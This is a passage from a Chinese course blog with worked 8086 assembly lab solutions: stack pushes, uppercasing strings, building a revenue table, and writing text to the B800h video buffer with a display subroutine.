class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0ah</span>,<span class="hljs-number">0bh</span>,<span class="hljs-number">0ch</span>,<span class="hljs-number">0dh</span>,<span class="hljs-number">0eh</span>,<span class="hljs-number">0fh</span>,<span class="hljs-number">0ffh</span><br>a ends<br>b <span class="hljs-meta">segment</span> <br><span class="hljs-built_in">dw</span> <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>b ends<br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol">start:</span><br>?<br>code ends<br>end start<br><br><br>补充后的代码如下：<br><br><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br>a <span class="hljs-meta">segment</span> <br><span class="hljs-built_in">dw</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0ah</span>,<span class="hljs-number">0bh</span>,<span class="hljs-number">0ch</span>,<span class="hljs-number">0dh</span>,<span class="hljs-number">0eh</span>,<span class="hljs-number">0fh</span>,<span class="hljs-number">0ffh</span><br>a ends<br><br>b <span class="hljs-meta">segment</span> <br><span class="hljs-built_in">dw</span> <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>b ends<br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">start:</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,a<br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br>        <br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,b<br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ss</span>,<span class="hljs-built_in">ax</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">sp</span>,<span class="hljs-number">16</span><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">8</span><br><span class="hljs-symbol">    s:</span>  <span class="hljs-keyword">push</span> [<span class="hljs-built_in">bx</span>]<br>        <span class="hljs-keyword">add</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">2</span><br>        <span class="hljs-keyword">loop</span> s <br><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br>    <span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br>code ends<br>end start<br></code></pre></td></tr></table></figure><hr /><h2 id="实验6-实践课程中的程序">实验6 实践课程中的程序</h2><hr /><p>将下面的程序补充完整，实现将 datasg 段中的每个单词的前 4个字母改为大写字母。【要求：仅能修改 codesg segment 的代码】</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:codesg, <span class="hljs-built_in">ss</span>:stacksg, <span class="hljs-built_in">ds</span>:datasg<br><br>stacksg <span class="hljs-meta">segment</span> <br><span class="hljs-built_in">dw</span> <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>stacksg ends<br><br>datasg <span class="hljs-meta">segment</span><br><span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;1. display &#x27;</span><br><span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;2. brows &#x27;</span><br><span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;3. replace &#x27;</span><br><span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;4. modify &#x27;</span><br>datasg ends<br><br>codesg <span class="hljs-meta">segment</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br><br>codesg ends<br>end start<br><br><br><br>修改后的代码：<br><br><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:codesg, <span class="hljs-built_in">ss</span>:stacksg, <span class="hljs-built_in">ds</span>:datasg<br><br>stacksg <span class="hljs-meta">segment</span> <br><span class="hljs-built_in">dw</span> <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>stacksg ends<br><br>datasg <span class="hljs-meta">segment</span><br><span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;1. display      &#x27;</span><br><span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;2. brows        &#x27;</span><br><span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;3. replace      &#x27;</span><br><span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;4. modify       &#x27;</span><br>datasg ends<br><br>codesg <span class="hljs-meta">segment</span><br><span class="hljs-symbol">start:</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,stacksg<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ss</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">sp</span>,<span class="hljs-number">16</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,datasg<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0</span><br><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">4</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">       s0:</span>  <span class="hljs-keyword">push</span> <span class="hljs-built_in">cx</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">si</span>,<span class="hljs-number">0</span><br>            <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">4</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">       s1:</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,[<span class="hljs-built_in">bx</span>+<span class="hljs-number">3</span>+<span class="hljs-built_in">si</span>]<br>            <span class="hljs-keyword">and</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">11011111b</span><br>            <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">bx</span>+<span class="hljs-number">3</span>+<span class="hljs-built_in">si</span>],<span class="hljs-built_in">al</span><br><br>            <span class="hljs-keyword">inc</span> <span class="hljs-built_in">si</span><br>            <span class="hljs-keyword">loop</span> s1<br><br>            <span class="hljs-keyword">add</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">16</span><br>            <span class="hljs-keyword">pop</span> <span class="hljs-built_in">cx</span><br>            <span class="hljs-keyword">loop</span> s0 <br><br><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br>        <span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br>codesg ends<br><br>end start<br></code></pre></td></tr></table></figure><hr /><h2 id="实验7-寻址方式在结构化数据访问中的应用">实验7寻址方式在结构化数据访问中的应用</h2><hr /><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:codesg<br><br>data <span class="hljs-meta">segment</span><br>        <span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;1975&#x27;</span>,<span class="hljs-string">&#x27;1976&#x27;</span>,<span class="hljs-string">&#x27;1977&#x27;</span>,<span class="hljs-string">&#x27;1978&#x27;</span>,<span class="hljs-string">&#x27;1979&#x27;</span>,<span class="hljs-string">&#x27;1980&#x27;</span>,<span class="hljs-string">&#x27;1981&#x27;</span>,<span class="hljs-string">&#x27;1982&#x27;</span>,<span class="hljs-string">&#x27;1983&#x27;</span><br>        <span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;1984&#x27;</span>,<span class="hljs-string">&#x27;1985&#x27;</span>,<span class="hljs-string">&#x27;1986&#x27;</span>,<span class="hljs-string">&#x27;1987&#x27;</span>,<span class="hljs-string">&#x27;1988&#x27;</span>,<span class="hljs-string">&#x27;1989&#x27;</span>,<span class="hljs-string">&#x27;1990&#x27;</span>,<span class="hljs-string">&#x27;1991&#x27;</span>,<span class="hljs-string">&#x27;1992&#x27;</span><br>        <span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;1993&#x27;</span>,<span class="hljs-string">&#x27;1994&#x27;</span>,<span class="hljs-string">&#x27;1995&#x27;</span><br>        <span class="hljs-comment">;以上是表示21年的21个字符串</span><br>        <span class="hljs-built_in">dd</span> <span class="hljs-number">16</span>,<span class="hljs-number">22</span>,<span class="hljs-number">382</span>,<span class="hljs-number">1356</span>,<span class="hljs-number">2390</span>,<span class="hljs-number">8000</span>,<span class="hljs-number">16000</span>,<span class="hljs-number">24486</span>,<span class="hljs-number">50065</span>,<span class="hljs-number">97479</span>,<span class="hljs-number">140417</span>,<span class="hljs-number">197514</span><br>        <span class="hljs-built_in">dd</span> <span class="hljs-number">345980</span>,<span class="hljs-number">590827</span>,<span class="hljs-number">803530</span>,<span class="hljs-number">1183000</span>,<span class="hljs-number">1843000</span>,<span class="hljs-number">2759000</span>,<span class="hljs-number">3753000</span>,<span class="hljs-number">4649000</span>,<span class="hljs-number">5937000</span><br>        <span class="hljs-comment">;以上是表示21年公司总收的21个dword型数据</span><br>        <span class="hljs-built_in">dw</span> <span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">13</span>,<span class="hljs-number">28</span>,<span class="hljs-number">38</span>,<span class="hljs-number">130</span>,<span class="hljs-number">220</span>,<span class="hljs-number">476</span>,<span class="hljs-number">778</span>,<span class="hljs-number">1001</span>,<span class="hljs-number">1442</span>,<span class="hljs-number">2258</span>,<span class="hljs-number">2793</span>,<span class="hljs-number">4037</span>,<span class="hljs-number">5635</span>,<span class="hljs-number">8226</span><br>        <span class="hljs-built_in">dw</span> <span class="hljs-number">11542</span>,<span class="hljs-number">14430</span>,<span class="hljs-number">15257</span>,<span class="hljs-number">17800</span><br>        <span class="hljs-comment">;以上是表示21年公司雇员人数的21个word型数据</span><br>data ends<br><br><br>table <span class="hljs-meta">segment</span><br>    <span class="hljs-built_in">db</span> <span class="hljs-number">21</span> dup (<span class="hljs-string">&#x27;year summ ne ?? &#x27;</span>)<br>table ends<br><br><br>codesg <span class="hljs-meta">segment</span><br><span class="hljs-symbol">start:</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,data<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,table<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">si</span>,<span class="hljs-number">0</span>       <span class="hljs-comment">;初始化年份和收入的具体位置</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">di</span>,<span class="hljs-number">0</span>   <span class="hljs-comment">;初始化雇员数和人均收入的具体位置</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">21</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">s:</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">es</span>:[<span class="hljs-built_in">si</span>]           <span class="hljs-comment">;年份和收入的低16bit，占两个字节</span><br><span class="hljs-keyword">mov</span> [<span class="hljs-built_in">bx</span>+<span class="hljs-number">0h</span>],<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">es</span>:[<span class="hljs-built_in">si</span>+<span class="hljs-number">54h</span>] <span class="hljs-comment">;加54h是因为21*4=84=54h</span><br><span class="hljs-keyword">mov</span> [<span class="hljs-built_in">bx</span>+<span class="hljs-number">5h</span>],<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">si</span>,<span class="hljs-number">2</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">es</span>:[<span class="hljs-built_in">si</span>]           <span class="hljs-comment">;年份和收入的高16bit，占两个字节</span><br><span class="hljs-keyword">mov</span> [<span class="hljs-built_in">bx</span>+<span class="hljs-number">2h</span>],<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">es</span>:[<span class="hljs-built_in">si</span>+<span class="hljs-number">54h</span>]<br><span class="hljs-keyword">mov</span> [<span class="hljs-built_in">bx</span>+<span class="hljs-number">7h</span>],<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">si</span>,<span class="hljs-number">2</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">es</span>:[<span class="hljs-built_in">di</span>+<span class="hljs-number">0a8h</span>]      <span class="hljs-comment">;雇员数，占两个字节，加0a8h是因为84*2=168=a8h</span><br><span class="hljs-keyword">mov</span> [<span class="hljs-built_in">bx</span>+<span class="hljs-number">0ah</span>],<span class="hljs-built_in">ax</span>          <br><span class="hljs-keyword">add</span> <span class="hljs-built_in">di</span>,<span class="hljs-number">2</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,[<span class="hljs-built_in">bx</span>+<span class="hljs-number">5h</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dx</span>,[<span class="hljs-built_in">bx</span>+<span class="hljs-number">7h</span>]<br><span class="hljs-keyword">div</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">bx</span>+<span class="hljs-number">0ah</span>]   <span class="hljs-comment">;除法算人均收入</span><br><span class="hljs-keyword">mov</span> [<span class="hljs-built_in">bx</span>+<span class="hljs-number">0dh</span>],<span class="hljs-built_in">ax</span><br><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">16</span><br><span class="hljs-keyword">loop</span> s<br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br>        <span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br>codesg ends<br><br><br>end start<br></code></pre></td></tr></table></figure><hr /><h2 id="实验9-根据材料编程">实验9 根据材料编程</h2><hr /><p>1.将你的姓名和学号在屏幕上中间显示出来。字符属性要求如下： 学号尾号为1，3，5，7，9 的为黑底绿色；学号尾号为 0，2，4，6，8 的为黑底红色。</p><ul><li><p>BL（闪烁） R G B（背景） I （高亮） R G B （前景）</p></li><li><p>80x25彩色字符模式显示缓冲区(以下简称为显示缓冲区)的结构:</p><ul><li>内存地址空间中，B8000H~BFFFFH 共32KB的空间，为80X25彩色字符模式的显示缓冲区。向这个地址空间写入数据，写入的内容将立即出现在显示器上。</li><li>在 80x25 彩色字符模式下，显示器可以显示 25行，每行80个字符，每个字符可以有256种属性(背景色、前景色、闪、高亮等合信息)。</li><li>这样，一个字符在显示缓冲区中就要占两个字节，分别存放字符的ASCII码和属性。</li><li>80x25模式下，一屏的内容在显示缓冲区中共占4000个字节。</li><li>显示缓冲区分为 8页，每页4KB(4000B)，显示器可以显示任意一页的内容。一般情况下，显示第0页的内容。也就是说通常情况下，B8000H~B8F9FH中的4000个字节的内容将出现在显示器上。</li></ul></li><li><p>在一页显示缓冲区中:</p><ul><li>偏移000~09F对应显示器上的第1行(80个字符占160个字节);</li><li>偏移0A0~13F对应显示器上的第2行;</li><li>偏移140~1DF对应显示器上的第3行;</li><li>依此类推，可知，偏移FOO~F9F 对应显示器上的第25 行。</li></ul></li><li><p>在一行中，<strong>一个字符占两个字节的存储空间(一个字)，低位字节存储字符的ASCII码，高位字节存储字符的属性。一行共有80个字符，占160个字节</strong>。即在一行中:</p><ul><li>00~01单元对应显示器上的第 1列:</li><li>02~03单元对应显示器上的第2列</li><li>04~05单元对应显示器上的第3 列</li><li>依此类推，可知，9E~9F 单元对应显示器上的第 80 列</li></ul></li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br><br>data <span class="hljs-meta">segment</span><br><span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;ID: 2021100001, Name: Lu Shuaichao&#x27;</span><br>data ends<br><br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">start:</span> <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,data<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0B800H</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span>                <span class="hljs-comment">;es 控制打印到屏幕上</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bp</span>,<span class="hljs-number">070eh</span>    <br><br><span class="hljs-comment">;bp 控制打印在屏幕上具体的位置。显示器中间的位置为第 12 行（一共25行嘛），对应的偏移为06e0h（11*160）。</span><br><span class="hljs-comment">;要打印的内容共 34 个字符，每个字符占两字节，每行占 160个字节，所以要从与行首位置偏移为 46（002eh）的位置写入，这个位置刚好为中间的位置。</span><br><span class="hljs-comment">;06e0h + 002eh 最终可得出应从偏移为 070eh 的位置开始写入。</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dl</span>,<span class="hljs-number">00000100b</span>          <span class="hljs-comment">;dl 寄存器存放颜色属性</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">34</span>                <span class="hljs-comment">;一次打印循环次数</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">s2:</span> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,[<span class="hljs-built_in">bx</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bp</span>],<span class="hljs-built_in">al</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bp</span>+<span class="hljs-number">1</span>],<span class="hljs-built_in">dl</span>          <span class="hljs-comment">;每次向显存中写入一个字符（两个字节）</span><br><br><span class="hljs-keyword">inc</span> <span class="hljs-built_in">bx</span>                   <span class="hljs-comment">;下一个字符</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">bp</span>,<span class="hljs-number">2</span><br><span class="hljs-keyword">loop</span> s2<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">s0:</span> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br><br>code ends<br>end start<br></code></pre></td></tr></table></figure><hr /><h2 id="实验10-编写子程序">实验10 编写子程序</h2><hr /><p>1.显示字符串</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br>data <span class="hljs-meta">segment</span><br><span class="hljs-built_in">db</span> <span class="hljs-string">&#x27;Welcome to masm!&#x27;</span>,<span class="hljs-number">0</span><br>data ends<br><br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">start:</span>  <span class="hljs-keyword">mov</span> <span class="hljs-number">dh</span>,<span class="hljs-number">8</span>           <span class="hljs-comment">;指定行号</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dl</span>,<span class="hljs-number">3</span>           <span class="hljs-comment">;指定列号</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cl</span>,<span class="hljs-number">2</span>   <span class="hljs-comment">;指定颜色</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,data<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">si</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">call</span> show_str<br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">show_str:</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">ax</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">bx</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">dx</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">si</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0B800H</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span>          <span class="hljs-comment">;设置es为显示区段地址</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">00A0H</span>       <span class="hljs-comment">;每行80个字符，一共占160个字节</span><br><span class="hljs-keyword">mul</span> <span class="hljs-number">dh</span>             <span class="hljs-comment">;设置字符显示在哪行</span><br><span class="hljs-keyword">mov</span> <span class="hljs-number">dh</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">dx</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">dx</span>          <span class="hljs-comment">;加两次是因为一个字符占两个字节，</span><br> <span class="hljs-comment">;比如屏幕上的一个字母a，它就占两个字节，一个字节是ascii码，一个字节是属性</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-built_in">ax</span>          <span class="hljs-comment">;bx是显示区的偏移地址</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-built_in">cl</span>         <span class="hljs-comment">;颜色属性存入al</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">si</span>,<span class="hljs-number">0</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">a:</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cl</span>,<span class="hljs-built_in">ds</span>:[<span class="hljs-built_in">si</span>]     <span class="hljs-comment">;ds:[si]是当前指向的字符</span><br><span class="hljs-keyword">mov</span> <span class="hljs-number">ch</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">jcxz</span> ok           <span class="hljs-comment">;读到0就退出循环</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bx</span>],<span class="hljs-built_in">cl</span>     <span class="hljs-comment">;第一个是字母</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">bx</span>+<span class="hljs-number">1</span>],<span class="hljs-built_in">al</span>    <span class="hljs-comment">;第二个是属性</span><br><br><span class="hljs-keyword">inc</span> <span class="hljs-built_in">si</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">2</span><br><span class="hljs-keyword">jmp</span> short a<br><span class="hljs-symbol"></span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">ok:</span> <span class="hljs-keyword">pop</span> <span class="hljs-built_in">si</span><br><span 